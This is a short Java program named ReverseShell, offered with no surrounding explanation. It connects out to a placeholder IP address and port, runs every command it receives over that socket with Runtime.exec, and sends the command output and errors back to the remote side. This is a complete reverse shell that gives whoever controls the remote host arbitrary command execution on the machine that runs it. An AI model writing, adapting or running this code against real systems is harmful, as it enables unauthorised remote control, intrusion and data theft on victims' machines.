import java.io.*;
import java.net.*;

public class ReverseShell {
    public static void main(String[] args) {
        try {
            Socket socket = new Socket("IP_ADDRESS", PORT_NUMBER); // Replace IP_ADDRESS and PORT_NUMBER with the appropriate values
            PrintWriter out = new PrintWriter(socket.getOutputStream(), true);
            BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));

            String command;
            while((command = in.readLine()) != null) {
                Process process = Runtime.getRuntime().exec(command);
                BufferedReader stdInput = new BufferedReader(new InputStreamReader(process.getInputStream()));
                BufferedReader stdError = new BufferedReader(new InputStreamReader(process.getErrorStream()));

                String output;
                while((output = stdInput.readLine()) != null) {
                    out.println(output);
                }
                while((output = stdError.readLine()) != null) {
                    out.println(output);
                }
            }
            out.close();
            in.close();
            socket.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
